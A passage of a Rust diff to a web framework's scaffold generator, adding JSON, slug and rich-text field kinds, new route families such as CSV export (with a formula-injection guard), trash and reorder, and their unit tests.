         FieldKind::F32 | FieldKind::F64 => "1.0".to_owned(),
         // Scale-derived rather than a fixed "1.0": a tightly-scaled column
@@ -6324,6 +12615,7 @@ fn sql_sample_literal(kind: FieldKind) -> String {
         // Always nullable (see `FieldKind::Attachment`'s doc comment), so it
         // never needs a sample literal to satisfy a `NOT NULL` constraint.
         FieldKind::Attachment => "NULL".to_owned(),
+        FieldKind::Json => "'{}'::jsonb".to_owned(),
     }
 }
 
@@ -6337,9 +12629,10 @@ const API_SMOKE_TEST_SEED_ROWS: usize = 25;
 /// `generate_series` index bound to `g` (1..=[`API_SMOKE_TEST_SEED_ROWS`]).
 ///
 /// The index is woven into the value for the types that can vary it while
-/// staying valid (text, integers, floats, timestamps) so that a `unique`
-/// column of one of those types does not collide across the seeded rows; the
-/// remaining types fall back to [`sql_sample_literal`]'s constant sample.
+/// staying valid (text, integers, floats, timestamps, json) so that a
+/// `unique` column of one of those types does not collide across the seeded
+/// rows; the remaining types fall back to [`sql_sample_literal`]'s constant
+/// sample.
 /// Those constant types (enum's closed set, a `references` FK id, bool,
 /// decimal at a fixed scale, bytea) cannot hold [`API_SMOKE_TEST_SEED_ROWS`]
 /// distinct values anyway — an inherent limit that only matters for the
@@ -6349,7 +12642,11 @@ const API_SMOKE_TEST_SEED_ROWS: usize = 25;
 /// per row.
 fn sql_seed_value_expr(f: &Field) -> String {
     match f.kind {
-        FieldKind::String | FieldKind::Text => "'sample-' || g".to_owned(),
+        // A slug field is always `unique` (issue #1260) -- it MUST vary per
+        // row here, or the seeded rows collide on the very first re-insert.
+        FieldKind::String | FieldKind::Text | FieldKind::RichText | FieldKind::Slug => {
+            "'sample-' || g".to_owned()
+        }
         FieldKind::I32 | FieldKind::I64 => "g".to_owned(),
         FieldKind::F32 | FieldKind::F64 => "g::double precision".to_owned(),
         FieldKind::NaiveDateTime | FieldKind::DateTime => {
@@ -6359,6 +12656,10 @@ fn sql_seed_value_expr(f: &Field) -> String {
         FieldKind::Enum => {
             format!("'{}'", f.variants.first().expect("enum field has variants"))
         }
+        // A constant `'{}'::jsonb` for every row (issue #1341 review) would
+        // collide on the very first re-insert for a `unique` json column —
+        // vary it with `g`, same as the text/numeric arms above.
+        FieldKind::Json => "('{\"seed\": ' || g || '}')::jsonb".to_owned(),
         _ => sql_sample_literal(f.kind),
     }
 }
@@ -6562,8 +12863,17 @@ fn render_enum_rejection_smoke_test(
 /// the duplicate-insert assertion would never trip.
 fn unique_sample_literal(kind: FieldKind) -> String {
     match kind {
-        FieldKind::String | FieldKind::Text | FieldKind::Enum => "'dup_value'".to_owned(),
-        FieldKind::I32 | FieldKind::I64 => "424242".to_owned(),
+        FieldKind::String
+        | FieldKind::Text
+        | FieldKind::RichText
+        | FieldKind::Enum
+        | FieldKind::Slug => "'dup_value'".to_owned(),
+        // `position`/`commentable` can never be `:unique` (both rejected in
+        // `parse_field`), so these arms are unreachable in practice — listed
+        // for exhaustiveness with the same literal as `I32`/`I64`.
+        FieldKind::I32 | FieldKind::I64 | FieldKind::Position | FieldKind::Commentable => {
+            "424242".to_owned()
+        }
         // Must be a real seeded row's id, not an arbitrary literal — a
         // `references` target column is FK-constrained against the stub
         // table `render_reference_stub_tables_sql` seeds exactly one row
@@ -6582,6 +12892,7 @@ fn unique_sample_literal(kind: FieldKind) -> String {
         FieldKind::DateTime => "'2024-01-01 00:00:00+00'::timestamptz".to_owned(),
         FieldKind::Bytea => "'\\xDEADBEEF'::bytea".to_owned(),
         FieldKind::Attachment => "NULL".to_owned(),
+        FieldKind::Json => "'{\"seed\": 1}'::jsonb".to_owned(),
     }
 }
 
@@ -6595,8 +12906,17 @@ fn unique_sample_literal(kind: FieldKind) -> String {
 /// to decide which violation Postgres actually reports.
 fn unique_sample_literal_variant(kind: FieldKind) -> String {
     match kind {
-        FieldKind::String | FieldKind::Text | FieldKind::Enum => "'dup_value_2'".to_owned(),
-        FieldKind::I32 | FieldKind::I64 => "424243".to_owned(),
+        FieldKind::String
+        | FieldKind::Text
+        | FieldKind::RichText
+        | FieldKind::Enum
+        | FieldKind::Slug => "'dup_value_2'".to_owned(),
+        // `position` can never be `:unique` (rejected in `parse_field`), so
+        // this arm is unreachable in practice — listed for exhaustiveness
+        // with the same literal as `I32`/`I64`.
+        FieldKind::I32 | FieldKind::I64 | FieldKind::Position | FieldKind::Commentable => {
+            "424243".to_owned()
+        }
         // The second stub row `render_reference_stub_tables_sql` seeds —
         // distinct from `unique_sample_literal`'s "1" for the same reason
         // that one must be a real seeded row's id, not an arbitrary literal.
@@ -6612,6 +12932,7 @@ fn unique_sample_literal_variant(kind: FieldKind) -> String {
         FieldKind::DateTime => "'2024-01-02 00:00:00+00'::timestamptz".to_owned(),
         FieldKind::Bytea => "'\\xBEEFDEAD'::bytea".to_owned(),
         FieldKind::Attachment => "NULL".to_owned(),
+        FieldKind::Json => "'{\"seed\": 2}'::jsonb".to_owned(),
     }
 }
 
@@ -6816,14 +13137,34 @@ fn render_unique_violation_smoke_test(
     out
 }
 
+#[allow(
+    clippy::too_many_arguments,
+    clippy::fn_params_excessive_bools,
+    reason = "one parameter per optional route family the scaffold can emit \
+              (live SSE, search, bulk delete, inline validation, state \
+              transitions, rich-text preview); grouping them into a struct would \
+              only move the same list one level out"
+)]
 fn main_route_entries(
     plural: &str,
     snake_name: &str,
     api: bool,
     live: bool,
     search: bool,
+    bulk_delete: bool,
+    export_csv: bool,
+    // Issue #1332: `true` under `--soft-delete` on the standard HTML path,
+    // mounting the trash view and its restore/purge controls.
+    trash: bool,
+    // Issue #1358: `true` when the model has a `position` field on the
+    // standard HTML path, mounting the two `move_up`/`move_down` controls.
+    reorder: bool,
     validated_field_names: &[String],
     sm_field_names: &[String],
+    rich_text_field_names: &[String],
+    // Issue #1323: `true` under `--belongs-to`, mounting the two nested
+    // handlers the routes module emits alongside the flat seven.
+    nested: bool,
 ) -> Vec<String> {
     if api {
         let mut entries = vec![
@@ -6847,6 +13188,35 @@ fn main_route_entries(
             format!("routes::{plural}::update"),
             format!("routes::{plural}::destroy"),
         ];
+        // Issue #1312: mount the bulk delete-selected route immediately after the
+        // per-row `destroy` it generalises. Gated with the handler emission in
+        // `render_routes_file` — mounting a route the module never emitted would
+        // fail the generated app to compile.
+        if bulk_delete {
+            entries.push(format!("routes::{plural}::bulk_delete"));
+        }
+        // Issue #1315: mount the CSV export next to the index it exports. Gated
+        // with the handler emission in `render_routes_file` for the same reason
+        // as `bulk_delete` above.
+        if export_csv {
+            entries.push(format!("routes::{plural}::export_csv"));
+        }
+        // Issue #1332: mount the trash view next to the index it recovers from,
+        // then its two per-row controls. Gated with the handler emission in
+        // `render_routes_file` for the same reason as `bulk_delete` above —
+        // mounting a route the module never emitted would fail the generated app
+        // to compile.
+        if trash {
+            entries.push(format!("routes::{plural}::trash"));
+            entries.push(format!("routes::{plural}::restore"));
+            entries.push(format!("routes::{plural}::purge"));
+        }
+        // Issue #1358: mount the reorder controls next to `destroy`, same
+        // reasoning as `bulk_delete`/`trash` above.
+        if reorder {
+            entries.push(format!("routes::{plural}::move_up"));
+            entries.push(format!("routes::{plural}::move_down"));
+        }
         if live {
             entries.push(format!("routes::{plural}::events"));
         }
@@ -6866,22 +13236,40 @@ fn main_route_entries(
         for field_name in sm_field_names {
             entries.push(format!("routes::{plural}::transition_{field_name}"));
         }
+        // Issue #1255: mount the `POST /{plural}/preview/{field}` fragment
+        // handler emitted for each `richtext` column, so the editor's htmx live
+        // preview resolves to a real route rather than 404ing. A scaffold with
+        // no rich-text column pushes nothing here and keeps the mounted route
+        // set byte-identical.
+        for field_name in rich_text_field_names {
+            entries.push(format!("routes::{plural}::preview_{field_name}"));
+        }
+        // Issue #1323: the nested read/create pair. Gated with the handler
+        // emission in `render_routes_file` — mounting a route the module never
+        // emitted would fail the generated app to compile.
+        if nested {
+            entries.push(format!("routes::{plural}::nested_index"));
+            entries.push(format!("routes::{plural}::nested_create"));
+        }
         entries.push(format!("repositories::{snake_name}::{snake_name}_api_list"));
         entries.push(format!("repositories::{snake_name}::{snake_name}_api_get"));
         entries
     }
 }
 
-/// The submit-token exempt-path prefix for a `--live-validation` resource.
+/// The submit-token exempt-path prefix for one family of a resource's
+/// form-echoing POST routes.
 ///
-/// The generated inline-validation routes are `POST /{plural}/validate/{field}`;
-/// this prefix exempts every one of them from the submit-token guard at once
-/// (the guard matches `exempt_paths` by prefix — an exact match, a prefix ending
-/// in `/`, or a prefix whose remainder begins with `/`, so `/{plural}/validate`
+/// `segment` is `"validate"` for the `--live-validation` inline-validation
+/// routes (`POST /{plural}/validate/{field}`, issue #1360) or `"preview"` for a
+/// `richtext` column's live Markdown preview (`POST /{plural}/preview/{field}`,
+/// issue #1255). Either prefix exempts every route in its family at once (the
+/// guard matches `exempt_paths` by prefix — an exact match, a prefix ending in
+/// `/`, or a prefix whose remainder begins with `/`, so `/{plural}/validate`
 /// covers `/{plural}/validate/title`, `/{plural}/validate/body`, … without
 /// touching the guarded `POST /{plural}` create route).
-fn submit_token_validate_exempt_prefix(plural: &str) -> String {
-    format!("/{plural}/validate")
+fn submit_token_exempt_prefix(plural: &str, segment: &str) -> String {
+    format!("/{plural}/{segment}")
 }
 
 /// The `(start, end)` line span of a top-level `[header]` TOML table — the
@@ -6898,9 +13286,10 @@ fn toml_table_block_range(lines: &[&str], header: &str) -> Option<(usize, usize)
     Some((start, end))
 }
 
-/// Ensure `/{plural}/validate` is listed under `[security.submit_token]
-/// exempt_paths` so a `--live-validation` scaffold's inline-validation POSTs
-/// never consume the one-time submit token (issue #1360).
+/// Ensure `/{plural}/{segment}` is listed under `[security.submit_token]
+/// exempt_paths` so a scaffold's form-echoing POSTs (inline validation,
+/// issue #1360; richtext preview, issue #1255) never consume the one-time
+/// submit token.
 ///
 /// This is the route-based, field-name-agnostic half of the fix: the
 /// `hx-params="not _submit_token"` markup filter only strips the DEFAULT field
@@ -6919,10 +13308,14 @@ fn toml_table_block_range(lines: &[&str], header: &str) -> Option<(usize, usize)
 /// Handles three shapes — no `[security.submit_token]` table (append a fresh
 /// one), a table without an `exempt_paths` key (insert the key after the
 /// header), and a table whose `exempt_paths` array is merged in place.
-fn append_submit_token_validate_exempt_to_toml(existing: &str, plural: &str) -> Option<String> {
+fn append_submit_token_exempt_to_toml(
+    existing: &str,
+    plural: &str,
+    segment: &str,
+) -> Option<String> {
     use toml_edit::{Array, DocumentMut, Item, Table, Value};
 
-    let exempt = submit_token_validate_exempt_prefix(plural);
+    let exempt = submit_token_exempt_prefix(plural, segment);
 
     // Parse format-preservingly so comments, ordering, and hand-crafted array
     // layout survive the edit. A config we can't parse is left untouched (and we
@@ -6965,19 +13358,20 @@ fn append_submit_token_validate_exempt_to_toml(existing: &str, plural: &str) -> 
     Some(doc.to_string())
 }
 
-/// Inverse of [`append_submit_token_validate_exempt_to_toml`] (`autumn
-/// destroy`, issue #1048): remove `/{plural}/validate` from
+/// Inverse of [`append_submit_token_exempt_to_toml`] (`autumn
+/// destroy`, issue #1048): remove `/{plural}/{segment}` from
 /// `[security.submit_token] exempt_paths`, dropping the whole block if that
 /// leaves an empty freshly-generated `exempt_paths = [...]` as its only key.
 ///
 /// Conservative: only touches an `exempt_paths` array that still contains the
 /// exact prefix this generator inserts, never a hand-edited value.
-pub(super) fn remove_submit_token_validate_exempt_from_toml(
+pub(super) fn remove_submit_token_exempt_from_toml(
     existing: &str,
     plural: &str,
+    segment: &str,
 ) -> String {
     const HEADER: &str = "[security.submit_token]";
-    let exempt = submit_token_validate_exempt_prefix(plural);
+    let exempt = submit_token_exempt_prefix(plural, segment);
     let quoted = format!("\"{exempt}\"");
 
     let lines: Vec<&str> = existing.lines().collect();
@@ -7044,6 +13438,10 @@ pub(super) fn remove_submit_token_validate_exempt_from_toml(
 }
 
 #[cfg(test)]
+// Test inputs like `"slug:slug{from:title}"` / `"post:references{label:title}"`
+// are literal DSL tokens, not format strings — the `{…}` is the scaffold's
+// own constraint-modifier syntax under test.
+#[allow(clippy::literal_string_with_formatting_args)]
 mod tests {
     use super::*;
     use crate::generate::Flags;
@@ -7116,6 +13514,41 @@ async fn main() {
         .await;
 }
 "#
+    }
+
+    /// Issue #1384: `generate scaffold` refuses a `{translatable}` column
+    /// rather than emit a CRUD form whose single text input would replace the
+    /// whole per-locale container on first save.
+    #[test]
+    fn plan_rejects_a_translatable_field_and_points_at_generate_model() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String{translatable}".into(), "body:Text".into()],
+            "20260427000000",
+        )
+        .unwrap_err()
+        .to_string();
+        assert!(err.contains("translatable"), "{err}");
+        assert!(err.contains("generate model"), "{err}");
+        assert!(err.contains("title"), "{err}");
+    }
+
+    /// The refusal is narrow: a scaffold with no translatable column is
+    /// unaffected (issue #1384 AC7).
+    #[test]
+    fn plan_still_accepts_a_scaffold_without_translatable_fields() {
+        let tmp = project_with_main(default_main());
+        assert!(
+            plan_scaffold(
+                tmp.path(),
+                "Post",
+                &["title:String".into(), "body:Text".into()],
+                "20260427000000",
+            )
+            .is_ok()
+        );
     }
 
     #[test]
@@ -9225,14 +15658,17 @@ async fn main() {
             "write-path tests must not gate on a running server's base URL: {test}"
         );
         // The write-path suite is present and in-process alongside the read one:
-        // the index/read test plus the write-path CRUD test.
+        // the index/read test, the write-path CRUD test, and (issue #1315) the
+        // CSV download test.
         assert_eq!(
             test.matches("#[tokio::test]").count(),
-            2,
-            "expected the read smoke test plus the write-path CRUD test: {test}"
+            3,
+            "expected the read smoke test, the write-path CRUD test and the CSV \
+             export test: {test}"
         );
         assert!(test.contains("posts_index_renders_scaffolded_rows"));
         assert!(test.contains("posts_write_path_crud"));
+        assert!(test.contains("posts_export_csv_downloads_a_spreadsheet"));
     }
 
     #[test]
@@ -9518,8 +15954,10 @@ async fn main() {
         assert!(routes.contains("multipart.next_field().await?"), "{routes}");
 
         // Preserve-on-update: an edit with no new file keeps the stored blob.
+        // Cloned, not moved, so `current` survives to the unique-violation 422
+        // re-render, which shows the currently stored attachment (issue #1236).
         assert!(
-            routes.contains("new.avatar = avatar_blob.or(current.avatar);"),
+            routes.contains("new.avatar = avatar_blob.or(current.avatar.clone());"),
             "{routes}"
         );
         // Create binds the streamed blob directly (None => NULL column).
@@ -9542,6 +15980,104 @@ async fn main() {
         // `autumn-web` dependency line to modify, which this stub-Cargo.toml
         // harness doesn't provide; it is proven end-to-end by the integration
         // test `scaffold_attachment_emits_zero_js_multipart_handlers`.
+    }
+
+    #[test]
+    fn execute_writes_json_field_textarea_and_parse_on_write() {
+        // Issue #1341 AC1/AC5: `config:json` (required) and `settings:Option<json>`
+        // (nullable) — the generated form renders both as `<textarea>` controls,
+        // and the write path parses the submitted text as JSON, 400ing (not
+        // 500ing) on invalid input rather than deserializing it directly.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &[
+                "title:String".into(),
+                "config:json".into(),
+                "settings:Option<jsonb>".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        let model = fs::read_to_string(tmp.path().join("src/models/post.rs")).unwrap();
+        let schema = fs::read_to_string(tmp.path().join("src/schema.rs")).unwrap();
+        let migration = fs::read_to_string(
+            tmp.path()
+                .join("migrations/20260427000000_create_posts/up.sql"),
+        )
+        .unwrap();
+
+        // AC2: the migration emits the JSONB column, `NOT NULL` for the
+        // required field and nullable for the `Option<jsonb>` one.
+        assert!(migration.contains("config JSONB NOT NULL"), "{migration}");
+        assert!(migration.contains("settings JSONB"), "{migration}");
+        assert!(
+            !migration.contains("settings JSONB NOT NULL"),
+            "{migration}"
+        );
+
+        // Form control: a real `<textarea>`, not the derived opaque-type
+        // fallback single-line text input.
+        assert!(
+            routes
+                .contains(".override_field(\"config\", autumn_web::form::FieldControl::Textarea)"),
+            "{routes}"
+        );
+        assert!(
+            routes.contains(
+                ".override_field(\"settings\", autumn_web::form::FieldControl::Textarea)"
+            ),
+            "{routes}"
+        );
+
+        // `PostForm` carries both fields as strings (the browser's wire shape),
+        // never the native `serde_json::Value` (which would silently wrap raw
+        // urlencoded text as a JSON *string* instead of parsing it).
+        assert!(routes.contains("pub config: String,"), "{routes}");
+        assert!(routes.contains("pub settings: Option<String>,"), "{routes}");
+        assert!(
+            !routes.contains("pub config: serde_json::Value"),
+            "{routes}"
+        );
+
+        // `into_new` parses via `serde_json::Value`'s `FromStr`, 400ing (not
+        // panicking/500ing) on invalid JSON — the same `bad_request_msg`
+        // pattern as decimal/enum/datetime fields, naming the field.
+        assert!(
+            routes.contains("form.config.parse::<serde_json::Value>()"),
+            "{routes}"
+        );
+        assert!(
+            routes.contains(
+                ".map_err(|err| autumn_web::AutumnError::bad_request_msg(format!(\"config: {err}\")))?"
+            ),
+            "{routes}"
+        );
+        // Nullable: a blank textarea means "no value" (`None`), not a 400 —
+        // filtered before parsing, mirroring the nullable-`DateTime` pattern.
+        assert!(
+            routes.contains("form.settings.as_deref().filter(|value| !value.trim().is_empty())"),
+            "{routes}"
+        );
+        assert!(
+            routes.contains(".map(|value| value.parse::<serde_json::Value>())"),
+            "{routes}"
+        );
+
+        // The generated `#[model]` struct field is the real, native type —
+        // `serde_json::Value`/`Option<serde_json::Value>` — not the form's
+        // `String` shadow, and the diesel `schema.rs` token is `Jsonb`.
+        assert!(model.contains("pub config: serde_json::Value,"), "{model}");
+        assert!(
+            model.contains("pub settings: Option<serde_json::Value>,"),
+            "{model}"
+        );
+        assert!(schema.contains("config -> Jsonb,"), "{schema}");
+        assert!(schema.contains("settings -> Nullable<Jsonb>,"), "{schema}");
     }
 
     // ── Typed form-input widgets (issue #1131) ──────────────────────
@@ -9611,6 +16147,10 @@ async fn main() {
             !routes.contains("autumn_web::form::select_input(&changeset"),
             "{routes}"
         );
+        // …with the flag off. Under `--i18n` the derive's hardcoded
+        // `— Unset —`/`Yes`/`No` are user-facing English that has to be
+        // claimed, so an override IS emitted — see
+        // `a_nullable_bool_translates_its_own_options`.
         assert!(
             !routes.contains(".override_field(\"archived\""),
             "nullable bool fields need no form_for override: {routes}"
@@ -10245,6 +16785,7 @@ async fn main() {
             false,
             false,
             None,
+            None,
         );
         assert!(
             rendered.contains("shard-aware"),
@@ -10268,6 +16809,7 @@ async fn main() {
             false,
             false,
             None,
+            None,
         );
         assert!(
             rendered.contains("control pool"),
@@ -10277,8 +16819,18 @@ async fn main() {
 
     #[test]
     fn repository_no_sharded_note_when_not_sharded() {
-        let rendered =
-            render_repository_file("Post", "post", &[], false, false, false, false, false, None);
+        let rendered = render_repository_file(
+            "Post",
+            "post",
+            &[],
+            false,
+            false,
+            false,
+            false,
+            false,
+            None,
+            None,
+        );
         assert!(
             !rendered.contains("shard-aware"),
             "non-sharded repository must not mention shard-aware: {rendered}"
@@ -10872,6 +17424,167 @@ async fn main() {
         assert!(!kind_is_sortable(FieldKind::Bytea));
         assert!(!kind_is_sortable(FieldKind::Attachment));
         assert!(!kind_is_sortable(FieldKind::Enum));
+        // Issue #1341: `serde_json::Value` isn't in the `#[model]` macro's
+        // orderable allowlist either.
+        assert!(!kind_is_sortable(FieldKind::Json));
+    }
+
+    /// A bare `Field` for the `csv_value_expr` table below.
+    fn csv_test_field(name: &str, kind: FieldKind, nullable: bool) -> Field {
+        Field {
+            name: name.to_string(),
+            kind,
+            nullable,
+            variants: Vec::new(),
+            unique: false,
+            constraints: FieldConstraints::default(),
+            state_machine: None,
+        }
+    }
+
+    #[test]
+    fn csv_value_expr_never_stringifies_an_option_as_none() {
+        // #1315 AC7: a nullable column must land on `unwrap_or_default()`, i.e.
+        // the empty string. A missing arm is what would silently export the
+        // literal `None` into a spreadsheet cell.
+        //
+        // The list below is every `FieldKind` that exists today; `csv_value_expr`
+        // ends in catch-all arms, so a NEW kind would be covered by fallthrough
+        // and silently uncovered here. Add it to this list when you add it to the
+        // enum — same convention as `kind_is_sortable_excludes_blobs_and_enums`.
+        for kind in [
+            FieldKind::String,
+            FieldKind::Text,
+            FieldKind::RichText,
+            FieldKind::Slug,
+            FieldKind::I32,
+            FieldKind::I64,
+            FieldKind::Bool,
+            FieldKind::F32,
+            FieldKind::F64,
+            FieldKind::Uuid,
+            FieldKind::NaiveDateTime,
+            FieldKind::DateTime,
+            FieldKind::Bytea,
+            FieldKind::Attachment,
+            FieldKind::References,
+            FieldKind::Enum,
+            FieldKind::Decimal {
+                precision: 10,
+                scale: 2,
+            },
+        ] {
+            let expr = csv_value_expr(&csv_test_field("col", kind, true));
+            // `unwrap_or_default()` closes the value expression itself; a
+            // text-backed kind then wraps it in the `csv_text_cell` guard, so
+            // the trailing `)` may belong to that wrapper.
+            let unwrapped = expr
+                .strip_prefix("csv_text_cell(")
+                .and_then(|rest| rest.strip_suffix(')'))
+                .unwrap_or(&expr);
+            assert_eq!(
+                csv_kind_is_text(kind),
+                expr.starts_with("csv_text_cell("),
+                "the formula guard must be applied to exactly the text kinds, \
+                 and {kind:?} disagrees: {expr}"
+            );
+            assert!(
+                unwrapped.ends_with("unwrap_or_default()"),
+                "nullable {kind:?} must serialize to an empty cell, got: {expr}"
+            );
+            let debug_fmt = concat!('{', ":?", '}');
+            assert!(
+                !expr.contains(debug_fmt),
+                "nullable {kind:?} must not debug-format an Option, got: {expr}"
+            );
+        }
+    }
+
+    #[test]
+    fn csv_value_expr_handles_the_kinds_without_a_display_impl() {
+        // `Blob` and `Vec<u8>` have no `Display`, so a bare `.to_string()`
+        // would not compile. Attachment is ALWAYS `Option<Blob>`, hence the
+        // same expression whether or not the field was declared nullable.
+        // Both carry the `csv_text_cell` guard: a blob key ends in a
+        // browser-supplied filename, and lossy UTF-8 of a `Bytea` is arbitrary
+        // user bytes — either can begin with `=`.
+        let attachment = csv_value_expr(&csv_test_field("cover", FieldKind::Attachment, false));
+        assert_eq!(
+            attachment,
+            "csv_text_cell(self.cover.as_ref().map(|blob| blob.key.clone()).unwrap_or_default())"
+        );
+        assert_eq!(
+            csv_value_expr(&csv_test_field("cover", FieldKind::Attachment, true)),
+            attachment
+        );
+        assert_eq!(
+            csv_value_expr(&csv_test_field("payload", FieldKind::Bytea, false)),
+            "csv_text_cell(String::from_utf8_lossy(&self.payload).into_owned())"
+        );
+        // An `Enum` column's Rust type is the generated enum, NOT `String`
+        // (see `Field::rust_type`), so it must take the `Display` arm rather
+        // than the `.clone()` one — `.clone()` there yields the wrong type.
+        assert_eq!(
+            csv_value_expr(&csv_test_field("status", FieldKind::Enum, false)),
+            "self.status.to_string()"
+        );
+    }
+
+    #[test]
+    fn csv_value_expr_json_uses_display_and_carries_the_formula_guard() {
+        // Issue #1341: `serde_json::Value` DOES implement `Display` (unlike
+        // `Blob`/`Vec<u8>`), so it falls through to the generic `.to_string()`
+        // arm — but is still wrapped in `csv_text_cell` (`csv_kind_is_text`),
+        // defensively guarding the rare top-level-negative-number case.
+        assert_eq!(
+            csv_value_expr(&csv_test_field("config", FieldKind::Json, false)),
+            "csv_text_cell(self.config.to_string())"
+        );
+        assert_eq!(
+            csv_value_expr(&csv_test_field("config", FieldKind::Json, true)),
+            "csv_text_cell(self.config.as_ref().map(ToString::to_string).unwrap_or_default())"
+        );
+        assert!(csv_kind_is_text(FieldKind::Json));
+    }
+
+    #[test]
+    fn csv_schema_impl_headers_and_record_stay_the_same_length() {
+        // `export_csv` writes `csv_columns()` as the header row and
+        // `to_csv_record()` as each data row: a length mismatch is a runtime
+        // `UnequalLengths` error on the very first export.
+        let fields = vec![
+            csv_test_field("title", FieldKind::String, false),
+            csv_test_field("views", FieldKind::I64, true),
+            csv_test_field("cover", FieldKind::Attachment, true),
+        ];
+        let rendered = render_csv_schema_impl("Post", &fields);
+        let headers = rendered
+            .split_once("&[")
+            .expect("csv_columns literal")
+            .1
+            .split_once(']')
+            .expect("csv_columns literal end")
+            .0;
+        let record = rendered
+            .split_once("vec![")
+            .expect("to_csv_record literal")
+            .1
+            .split_once("\n        ]")
+            .expect("to_csv_record literal end")
+            .0;
+        assert_eq!(
+            headers.matches('"').count() / 2,
+            record
+                .lines()
+                .filter(|l| l.trim_end().ends_with(','))
+                .count(),
+            "csv_columns and to_csv_record must have one entry each:\n{rendered}"
+        );
+        // id first, created_at last, declared columns in between.
+        assert!(
+            headers.starts_with("\"id\"") && headers.ends_with("\"created_at\""),
+            "{headers}"
+        );
     }
 
     #[test]
@@ -10965,7 +17678,7 @@ async fn main() {
         let tmp = project_with_main(default_main());
         fs::write(
             tmp.path().join("Cargo.toml"),
-            "[package]\nname=\"x\"\n\n[dependencies]\nautumn-web = \"0.5.0\"\n",
+            "[package]\nname=\"x\"\n\n[dependencies]\nautumn-web = \"0.6.0\"\n",
         )
         .unwrap();
         let plan = plan_scaffold_with_options(
@@ -10991,7 +17704,7 @@ async fn main() {
         let tmp = project_with_main(default_main());
         fs::write(
             tmp.path().join("Cargo.toml"),
-            "[package]\nname=\"x\"\n\n[dependencies]\nautumn-web = \"0.5.0\"\n",
+            "[package]\nname=\"x\"\n\n[dependencies]\nautumn-web = \"0.6.0\"\n",
         )
         .unwrap();
         let plan = plan_scaffold_with_options(
@@ -11951,6 +18664,512 @@ async fn main() {
         );
     }
 
+    // ── slug (issue #1260) ──────────────────────────────────────────────────
+
+    #[test]
+    fn scaffold_slug_field_migration_is_not_null_and_unique() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let up = fs::read_to_string(
+            tmp.path()
+                .join("migrations/20260427000000_create_posts/up.sql"),
+        )
+        .unwrap();
+        assert!(up.contains("slug TEXT NOT NULL"), "up.sql: {up}");
+        assert!(
+            up.contains("CREATE UNIQUE INDEX idx_posts_slug_unique ON posts (slug);"),
+            "up.sql: {up}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_field_adds_find_by_slug_to_repository_for_free() {
+        // A slug is implicitly `unique` (dsl.rs), so this falls into the
+        // existing issue #1032 "every unique field gets a `find_by_<field>`"
+        // machinery with zero new repository codegen.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let repo = fs::read_to_string(tmp.path().join("src/repositories/post.rs")).unwrap();
+        assert!(
+            repo.contains("fn find_by_slug(slug: String) -> Vec<Post>;"),
+            "repo: {repo}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_field_routes_key_off_slug_not_id() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(routes.contains(r#"#[get("/posts/{slug}")]"#), "{routes}");
+        assert!(
+            routes.contains(r#"#[get("/posts/{slug}/edit", name = "edit")]"#),
+            "{routes}"
+        );
+        assert!(
+            routes.contains(r#"#[post("/posts/{slug}/update")]"#),
+            "{routes}"
+        );
+        assert!(
+            routes.contains(r#"#[post("/posts/{slug}/delete", name = "delete")]"#),
+            "{routes}"
+        );
+        assert!(
+            routes.contains("Path(__route_key): Path<String>"),
+            "{routes}"
+        );
+        assert!(
+            routes.contains("posts::table\n        .filter(posts::slug.eq(&__route_key))"),
+            "{routes}"
+        );
+        // AC6, falsifiable check: zero `/{id}`-keyed HTML route ATTRIBUTES remain
+        // for a slug-bearing model (doc comments legitimately still mention the
+        // still-id-keyed JSON REST API, e.g. `PUT /api/posts/{id}` — that's the
+        // auto-generated `#[repository]` surface, out of scope here, so this
+        // checks the `#[get(...)]`/`#[post(...)]` attributes specifically, not
+        // the whole file).
+        assert!(!routes.contains(r#"#[get("/posts/{id}"#), "{routes}");
+        assert!(!routes.contains(r#"#[post("/posts/{id}"#), "{routes}");
+        assert!(!routes.contains("Path<i64>"), "{routes}");
+    }
+
+    #[test]
+    fn scaffold_slug_field_show_returns_404_on_miss() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(
+            routes.contains(
+                "        .first(&mut *db)\n        .await\n        .map_err(AutumnError::not_found)?;"
+            ),
+            "show/edit must map a missing row to a 404 via AutumnError::not_found: {routes}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_field_create_auto_derives_when_blank_with_collision_suffix() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(
+            routes.contains("let mut new = into_new(changeset.data())?;"),
+            "{routes}"
+        );
+        assert!(routes.contains("if new.slug.is_empty() {"), "{routes}");
+        assert!(
+            routes.contains("let base = autumn_web::slugify(&new.title);"),
+            "{routes}"
+        );
+        assert!(
+            routes.contains("candidate = format!(\"{base}-{suffix}\");"),
+            "{routes}"
+        );
